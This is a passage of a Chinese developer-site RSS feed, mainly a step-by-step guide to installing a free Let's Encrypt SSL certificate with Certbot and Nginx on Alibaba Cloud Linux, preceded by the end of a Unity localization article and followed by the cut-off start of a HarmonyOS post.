<li>方便起见，，直接通过面板拖拽的方式转递对象和其对应的配置数据key（任一语言即可），即完成了本地化配置，无需通过脚本访问（比如Title文本组件对应配置中的标题key）。注意，此时的Localization Config是一个专属于此UI的局部配置文件（且与持有的本地化配置A可以不同）。</li>
</ul>
<p>PS:当局部配置找不到对应的key时，底层规定会去全局本地化配置表里寻找。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f2b934c78274f5281b4c920d0f867aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=OL5Gnj72FCqHeyin%2BDREPaJy9Pw%3D" alt="alt" loading="lazy"/>​</p>
<p>集成了UI_WindowBase的UI窗口类可以通过重写OnUpdateLanguage方法定制语言更新时的事件触发，比如文字拼接部分更新。</p>
<pre><code class="hljs language-ini" lang="ini">    public Text test<span class="hljs-comment">;</span>
    protected override void OnUpdateLanguage(LanguageType languageType) {
        string <span class="hljs-attr">info</span> = LocalizationSystem.GetContent&lt;LocalizationStringData&gt;(<span class="hljs-string">"标题"</span>, languageType).content<span class="hljs-comment">;</span>
        info += "test"<span class="hljs-comment">;</span>
        <span class="hljs-attr">test.text</span> = info<span class="hljs-comment">;</span>
    }
</code></pre>
<h3 data-id="heading-115">拓展</h3>
<p>尽管本地化系统目前仅支持文字和Sprite的切换，但是对于音效，配音等资源的切换也可以很方便拓展，这部分功能就不做预制了，由开发者自行拓展，以下是拓展思路。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//拓展API</span>
<span class="hljs-comment">//获取全局配置文件的某一语言下的数据（文本/图片）</span>
LocalizationSystem.GetContent&lt;T&gt;(string key, LanguageType languageType)


<span class="hljs-comment">//拓展位置  LocalizationData.cs</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationDataBase</span>
{
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationStringData</span> : <span class="hljs-type">LocalizationDataBase</span>
{
    <span class="hljs-keyword">public</span> string content;
}
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationImageData</span> : <span class="hljs-type">LocalizationDataBase</span>
{
    <span class="hljs-keyword">public</span> Sprite content;
}
</code></pre>
<ul>
<li>在本地化系统的内部实现中，GetContent的泛型参数T指定了本地化保存的数据类型，内置了LocalizationStringData和LocalIzationImageData两种数据类型，分别持有string成员和Sprite成员，对应文本和图片数据。</li>
<li>有两种修改思路，一种是在已有的两个个数据类型添加额外的数据成员,比如一个武器在UI上的显示除了有描述内容还有武器的类型string。</li>
</ul>

<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationStringData</span> : <span class="hljs-title class_">LocalizationDataBase</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> content;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-keyword">type</span>;
}
</code></pre>
<ul>
<li>另外一种是直接继承抽象类LocalizationDataBase写一个新类，比如还是武器类型和武器描述的UI本地化数据,其实两种方式本质也没啥区别，只是说明数据类数量和类内的数据成员都可以扩展满足开发者想要的需求。</li>
</ul>

<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalizationWeaponData</span> : <span class="hljs-title class_">LocalizationDataBase</span>
{
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> content;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-keyword">type</span>;
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🌐 阿里云 Linux 服务器 Let's Encrypt 免费 SSL 证书完整部署指南]]></title>    <link>https://juejin.cn/post/7575102209605877786</link>    <guid>https://juejin.cn/post/7575102209605877786</guid>    <pubDate>2025-11-23T05:36:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102209605877786" data-draft-id="7575182522410909734" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🌐 阿里云 Linux 服务器 Let's Encrypt 免费 SSL 证书完整部署指南"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T05:36:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="纯粹的热爱"/> <meta itemprop="url" content="https://juejin.cn/user/3540880762088056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🌐 阿里云 Linux 服务器 Let's Encrypt 免费 SSL 证书完整部署指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3540880762088056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    纯粹的热爱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T05:36:14.000Z" title="Sun Nov 23 2025 05:36:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🌐 阿里云 Linux 服务器 Let's Encrypt 免费 SSL 证书完整部署指南</h2>
<blockquote>
<p><strong>适用系统</strong>：Alibaba Cloud Linux 3（兼容 CentOS/RHEL）<br/>
<strong>Web 服务器</strong>：Nginx<br/>
<strong>更新时间</strong>：2025 年 11 月<br/>
<strong>作者</strong>：DevOps Guide</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">✅ 一、前提条件</h3>
<p>在开始前，请确保满足以下条件：</p>





























<table><thead><tr><th>要求</th><th>说明</th></tr></thead><tbody><tr><td><strong>1. 阿里云 ECS 实例</strong></td><td>已创建，操作系统为 Alibaba Cloud Linux 3</td></tr><tr><td><strong>2. 域名已解析</strong></td><td><code>yourdomain.com</code> 的 A 记录指向 ECS <strong>公网 IP</strong></td></tr><tr><td><strong>3. 安全组开放端口</strong></td><td>入方向允许 <code>80 (HTTP)</code> 和 <code>443 (HTTPS)</code>（来源：<code>0.0.0.0/0</code>）</td></tr><tr><td><strong>4. 域名备案（中国大陆地域）</strong></td><td>若 ECS 位于中国内地（如杭州、北京），<strong>必须完成 ICP 备案</strong></td></tr><tr><td><strong>5. 已安装 Nginx</strong></td><td>且能通过 <code>http://yourdomain.com</code> 访问</td></tr></tbody></table>
<blockquote>
<p>🔍 验证域名解析：</p>
<pre><code class="hljs language-bash" lang="bash">dig yourdomain.com +short
<span class="hljs-comment"># 应返回你的 ECS 公网 IP</span>
</code></pre>
</blockquote>
<hr/>
<h3 data-id="heading-2">🚀 二、完整操作流程</h3>
<h4 data-id="heading-3">步骤 1：安装 Nginx（如未安装）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 Nginx</span>
sudo dnf install -y nginx

<span class="hljs-comment"># 启动并设置开机自启</span>
sudo systemctl start nginx
sudo systemctl <span class="hljs-built_in">enable</span> nginx
</code></pre>
<hr/>
<h4 data-id="heading-4">步骤 2：配置 Nginx 站点（添加 server_name）</h4>
<pre><code class="hljs language-bash" lang="bash">sudo vim /etc/nginx/conf.d/yourdomain.com.conf
</code></pre>
<p>写入以下内容：</p>
<pre><code class="hljs language-nginx" lang="nginx">server {
    listen 80;
    server_name yourdomain.com;  # ← 必须包含你要申请证书的域名
    root /usr/share/nginx/html;
    index index.html;
}
</code></pre>
<p>测试并重载：</p>
<pre><code class="hljs language-bash" lang="bash">sudo nginx -t
sudo systemctl reload nginx
</code></pre>
<blockquote>
<p>✅ 此时应能通过浏览器访问 <code>http://yourdomain.com</code></p>
</blockquote>
<hr/>
<h4 data-id="heading-5">步骤 3：安装 Certbot</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 EPEL 仓库</span>
sudo dnf install -y epel-release

<span class="hljs-comment"># 安装 Certbot 及 Nginx 插件</span>
sudo dnf install -y certbot python3-certbot-nginx
</code></pre>
<hr/>
<h4 data-id="heading-6">步骤 4：申请并安装 SSL 证书</h4>
<pre><code class="hljs language-bash" lang="bash">sudo certbot --nginx -d yourdomain.com
</code></pre>
<p>执行时会提示：</p>
<ul>
<li>输入邮箱（用于过期提醒）</li>
<li>同意服务条款（按 <code>A</code>）</li>
<li>是否重定向 HTTP → HTTPS（建议选 <strong>Yes</strong>）</li>
</ul>
<blockquote>
<p>✅ 成功后，Nginx 会自动启用 HTTPS，访问 <code>https://yourdomain.com</code> 应显示安全锁图标。</p>
</blockquote>
<hr/>
<h4 data-id="heading-7">步骤 5：验证证书信息</h4>
<pre><code class="hljs language-bash" lang="bash">sudo certbot certificates
</code></pre>
<p>输出示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Certificate</span> <span class="hljs-title class_">Name</span>: yourdomain.<span class="hljs-property">com</span>
    <span class="hljs-title class_">Expiry</span> <span class="hljs-title class_">Date</span>: <span class="hljs-number">2026</span>-<span class="hljs-number">02</span>-<span class="hljs-number">20</span> <span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span> (<span class="hljs-attr">VALID</span>: <span class="hljs-number">89</span> days)
    <span class="hljs-title class_">Certificate</span> <span class="hljs-title class_">Path</span>: <span class="hljs-regexp">/etc/</span>letsencrypt/live/yourdomain.<span class="hljs-property">com</span>/fullchain.<span class="hljs-property">pem</span>
    <span class="hljs-title class_">Private</span> <span class="hljs-title class_">Key</span> <span class="hljs-title class_">Path</span>: <span class="hljs-regexp">/etc/</span>letsencrypt/live/yourdomain.<span class="hljs-property">com</span>/privkey.<span class="hljs-property">pem</span>
</code></pre>
<hr/>
<h4 data-id="heading-8">步骤 6：配置自动续期（关键！）</h4>
<h5 data-id="heading-9">6.1 测试续期流程（安全，不会真续）</h5>
<pre><code class="hljs language-bash" lang="bash">sudo certbot renew --dry-run
</code></pre>
<p>✅ 应看到：<code>Congratulations, all simulated renewals succeeded.</code></p>
<h5 data-id="heading-10">6.2 设置定时任务</h5>
<pre><code class="hljs language-bash" lang="bash">sudo crontab -e
</code></pre>
<p>在打开的编辑器中<strong>按 <code>i</code> 进入插入模式</strong>，粘贴以下内容：</p>
<pre><code class="hljs language-cron" lang="cron">0 2 * * * /usr/bin/certbot renew --quiet --post-hook "systemctl reload nginx"
</code></pre>
<p>保存退出：</p>
<ul>
<li>按 <code>ESC</code></li>
<li>输入 <code>:wq</code> 并回车</li>
</ul>
<h5 data-id="heading-11">6.3 验证 cron 是否设置成功</h5>
<pre><code class="hljs language-bash" lang="bash">sudo crontab -l
</code></pre>
<p>应输出：</p>
<pre><code class="hljs language-bash" lang="bash">0 2 * * * /usr/bin/certbot renew --quiet --post-hook <span class="hljs-string">"systemctl reload nginx"</span>
</code></pre>
<hr/>
<h3 data-id="heading-12">🔍 三、常见问题排查</h3>
<h4 data-id="heading-13">❌ 问题 1：申请证书时超时（Timeout during connect）</h4>
<p><strong>错误示例</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">Fetching http:<span class="hljs-comment">//yourdomain.com/.well-known/acme-challenge/...: Timeout</span>
</code></pre>
<p><strong>原因与解决</strong>：</p>

























<table><thead><tr><th>原因</th><th>解决方案</th></tr></thead><tbody><tr><td>阿里云安全组未开 80 端口</td><td>控制台 → 安全组 → 添加 80 入站规则</td></tr><tr><td>域名未备案（中国内地 ECS）</td><td>备案域名，或改用 <strong>DNS 验证</strong>（见附录）</td></tr><tr><td>DNS 未解析到公网 IP</td><td>检查 A 记录：<code>dig yourdomain.com</code></td></tr><tr><td>本地防火墙阻止</td><td>检查：<code>sudo firewall-cmd --list-ports</code>（Alibaba Cloud Linux 默认关闭）</td></tr></tbody></table>
<hr/>
<h4 data-id="heading-14">❌ 问题 2：Certbot 找不到 server_name</h4>
<p><strong>错误</strong>：<code>No matching server blocks located</code></p>
<p><strong>解决</strong>：</p>
<ul>
<li>确保 Nginx 配置中 <code>server_name</code> <strong>精确包含</strong> <code>yourdomain.com</code></li>
<li>配置文件必须在 <code>/etc/nginx/conf.d/</code> 或被 <code>nginx.conf</code> 的 <code>include</code> 包含</li>
</ul>
<hr/>
<h4 data-id="heading-15">❌ 问题 3：自动续期失败</h4>
<p><strong>排查步骤</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看 cron 执行日志</span>
sudo grep CRON /var/log/cron

<span class="hljs-comment"># 查看 certbot 日志</span>
sudo <span class="hljs-built_in">tail</span> -n 20 /var/log/letsencrypt/letsencrypt.log

<span class="hljs-comment"># 手动运行续期（不静默）</span>
sudo certbot renew
</code></pre>
<hr/>
<h3 data-id="heading-16">📎 附录：替代方案 —— DNS 验证（无需 80 端口）</h3>
<blockquote>
<p>适用于：<strong>未备案域名</strong> 或 <strong>无法开放 80 端口</strong> 的场景</p>
</blockquote>
<h4 data-id="heading-17">步骤 A：获取阿里云 AccessKey</h4>
<ol>
<li>进入 <a href="https://link.juejin.cn?target=https%3A%2F%2Fram.console.aliyun.com%2F" target="_blank" title="https://ram.console.aliyun.com/" ref="nofollow noopener noreferrer">RAM 控制台</a></li>
<li>创建用户，授权 <code>AliyunDNSFullAccess</code></li>
<li>获取 <code>AccessKey ID</code> 和 <code>AccessKey Secret</code></li>
</ol>
<h4 data-id="heading-18">步骤 B：配置 DNS 插件</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装插件</span>
sudo dnf install -y certbot-dns-alidns

<span class="hljs-comment"># 创建凭证文件</span>
<span class="hljs-built_in">mkdir</span> -p ~/.secrets
<span class="hljs-built_in">cat</span> &gt; ~/.secrets/alidns.ini &lt;&lt;<span class="hljs-string">EOF
dns_alidns_access_key = YOUR_ACCESS_KEY_ID
dns_alidns_secret_key = YOUR_ACCESS_KEY_SECRET
EOF</span>

<span class="hljs-built_in">chmod</span> 600 ~/.secrets/alidns.ini
</code></pre>
<h4 data-id="heading-19">步骤 C：申请证书</h4>
<pre><code class="hljs language-bash" lang="bash">sudo certbot certonly \
  --dns-alidns \
  --dns-alidns-credentials ~/.secrets/alidns.ini \
  -d yourdomain.com
</code></pre>
<h4 data-id="heading-20">步骤 D：手动配置 Nginx HTTPS</h4>
<p>编辑 <code>/etc/nginx/conf.d/yourdomain.com.conf</code>，添加：</p>
<pre><code class="hljs language-nginx" lang="nginx">server {
    listen 443 ssl;
    server_name yourdomain.com;
    root /usr/share/nginx/html;

    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
}
</code></pre>
<p>重载 Nginx：</p>
<pre><code class="hljs language-bash" lang="bash">sudo nginx -t &amp;&amp; sudo systemctl reload nginx
</code></pre>
<blockquote>
<p>⚠️ DNS 验证方式 <strong>仍需配置自动续期 cron</strong>（同上）</p>
</blockquote>
<hr/>
<h3 data-id="heading-21">✅ 四、总结</h3>








































<table><thead><tr><th>步骤</th><th>命令/操作</th><th>状态</th></tr></thead><tbody><tr><td>1. 安装 Nginx</td><td><code>sudo dnf install nginx</code></td><td>✅</td></tr><tr><td>2. 配置站点</td><td>创建 <code>/etc/nginx/conf.d/*.conf</code></td><td>✅</td></tr><tr><td>3. 安装 Certbot</td><td><code>sudo dnf install certbot...</code></td><td>✅</td></tr><tr><td>4. 申请证书</td><td><code>sudo certbot --nginx -d yourdomain.com</code></td><td>✅</td></tr><tr><td>5. 设置自动续期</td><td><code>sudo crontab -e</code> + 添加任务</td><td>✅</td></tr><tr><td>6. 测试续期</td><td><code>sudo certbot renew --dry-run</code></td><td>✅</td></tr></tbody></table>
<blockquote>
<p>🎉 <strong>完成！你的网站现在拥有免费、自动更新的 HTTPS 加密。</strong></p>
</blockquote>
<hr/>
<p>🔗 <strong>官方参考</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcertbot.eff.org%2F" target="_blank" title="https://certbot.eff.org/" ref="nofollow noopener noreferrer">Certbot 官网</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fletsencrypt.org%2Fdocs%2F" target="_blank" title="https://letsencrypt.org/docs/" ref="nofollow noopener noreferrer">Let's Encrypt 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fdocument_detail%2F25471.html" target="_blank" title="https://help.aliyun.com/document_detail/25471.html" ref="nofollow noopener noreferrer">阿里云安全组配置</a></li>
</ul>
<blockquote>
<p>💡 <strong>提示</strong>：每 3 个月手动运行一次 <code>sudo certbot certificates</code> 检查到期时间，确保万无一失。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[鸿蒙ets实现强制蜂窝网络]]></title>    <link>https://juejin.cn/post/7575090551357472820</link>    <guid>https://juejin.cn/post/7575090551357472820</guid>    <pubDate>2025-11-23T05:56:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357472820" data-draft-id="7575090551357456436" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="鸿蒙ets实现强制蜂窝网络"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-11-23T05:56:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="波儿菜"/> <meta itemprop="url" content="https://juejin.cn/user/2735240659351112"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            鸿蒙ets实现强制蜂窝网络
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2735240659351112/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    波儿菜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T05:56:13.000Z" title="Sun Nov 23 2025 05:56:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 